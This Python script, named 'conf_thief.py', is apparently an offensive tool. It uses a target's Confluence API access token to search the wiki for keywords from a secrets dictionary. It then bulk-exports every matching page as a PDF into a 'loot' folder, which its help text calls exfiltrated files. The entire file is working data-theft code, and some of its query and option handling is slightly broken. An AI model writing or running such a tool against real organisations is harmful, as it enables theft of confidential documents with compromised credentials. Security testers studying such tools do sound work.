import requests, json, sys, getopt
from atlassian import Confluence

contentSet = set()

headers = {
    'Accept': 'application/json',
}

def getNumberOfPages(query, username, access_token, cURL):
    totalSize = 0
    q = "/wiki/rest/api/search"
    URL = cURL + q
    response = requests.request("GET",
        URL,
        auth=(username, access_token),
        headers=headers,
        params=query
    )

    jsonResp = response.json()
    totalSize = int(jsonResp["totalSize"])
    return totalSize

def searchKeyWords(path, username, access_token, cURL):
    search_term = " "
    q = '/wiki/rest/api/search?start=1&limit=250'
    try:
        f = open(path, "r")
    except Exception as e:
        print('[*] An Error occured opening the dictionary file: %s' % str(e))
        sys.exit(2)

    print("[*] Searching for Confluence content for keywords and compiling a list of pages")
    for line in f:
        fullURL = ""
        tempSetCount = len(contentSet)
        count = 0
        search_term = line.strip()
        query = {
            'cql': '{text~\"' + search_term + '\"}'
        }
        totalSize = getNumberOfPages(query, username, access_token, cURL)
        if totalSize:
            URL = cURL + q
            searchQuery = {
                'cql': '{text~\"' + search_term + '\"'
            }

            response = requests.request("GET",
                URL,
                auth=(username, access_token),
                headers=headers,
                params=searchQuery
            )

            jsonResp = json.loads(response.text)
            for results in jsonResp['results']:
                contentId = results['content']['id']
                contentSet.add(contentId)
            if len(contentSet) > tempSetCount:
                count = len(contentSet) - tempSetCount
                tempSetCount = len(contentSet)
            print("[*] %i unique pages added to the set for search term: %s." % (count, search_term))
        else:
            print("[*] No documents found for search term: %s" % search_term)
    #print(contentSet)
    print("[*] Compiled set of %i unique pages to download from your search" % len(contentSet))

def downloadContent(username, access_token, cURL):
    confluence = Confluence(
        URL = cURL,
        api_version = "cloud",
        username = username,
        password = access_token
    )
    print('[*] Downloading files')
    count = 1
    for contentId in contentSet:
        response = confluence.export_page(contentId)
        path = 'loot/' + contentId + '.pdf'
        with open(path, 'wb') as f:
            f.write(response)
        print('[*] Downloaded %i of %i files: %s.pdf]' % (count, len(contentSet), contentId))
        count += 1


def main():
    cURL=""
    dict_path = ""
    username = ""
    access_token = ""

    # usage
    usage = '\nusage: python3 conf_thief.py [-h] -c <TARGET URL> -u <Target Username> -p <API ACCESS TOKEN> -d <DICTIONARY FILE PATH>'

    #help
    help = '\nThis Module will connect to Confluence\'s API using an access token, '
    help += 'export to PDF, and download the Confluence documents\nthat the target has access to. '  
    help += 'It allows you to use a dictionary/keyword search file to search all files in the target\nConfluence for' 
    help += ' potentially sensitive data. It will output exfiltrated PDFs to the ./loot directory'
    help += '\n\narguments:'
    help += '\n\t-c <TARGET CONFLUENCE URL>, --url <TARGET CONFLUENCE URL>'
    help += '\n\t\tThe URL of target Confluence account'
    help += '\n\t-u <TARGET CONFLUENCE ACCOUNT USERNAME>, --user <TARGET USERNAME>'
    help += '\n\t\tThe username of target Confluence account'
    help += '\n\t-p <TARGET CONFLUENCE ACCOUNT API ACCESS TOKEN>, --accesstoken <TARGET CONFLUENCE ACCOUNT API ACCESS TOKEN>'
    help += '\n\t\tThe API Access Token of target Confluence account'
    help += '\n\t-d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>'
    help += '\n\t\tPath to the dictionary file.'
    help += '\n\t\tYou can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"'
    help += '\n\noptional arguments:'
    help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'

    # try parsing options and arguments
    try :
        opts, args = getopt.getopt(sys.argv[1:], "hc:u:p:d:", ["help", "url=", "user=", "apitoken=", "dict="])
    except getopt.GetoptError as err:
        print(str(err))
        print(usage)
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()
        if opt in ("-c", "--url"):
            cURL = arg
        if opt in ("-u", "--user"):
            username = arg
        if opt in ("-p", "--accesstoken"):
            access_token = arg
        if opt in ("-d", "--dict"):
            dict_path = arg

    # check for mandatory arguments
    if not username:
        print("\nUsername  (-u, --user) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not access_token:
        print("\nAccess Token  (-p, --access_token) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not dict_path:
        print("\nDictionary Path  (-d, --dict) is a mandatory argument\n")
        print(usage)
        sys.exit(2)
    if not cURL:
        print("\nConfluence URL  (-c, --url) is a mandatory argument\n")
        print(usage)
        sys.exit(2)


    searchKeyWords(dict_path, username, access_token, cURL)
    downloadContent(username, access_token, cURL)

if __name__ == "__main__":
    main()
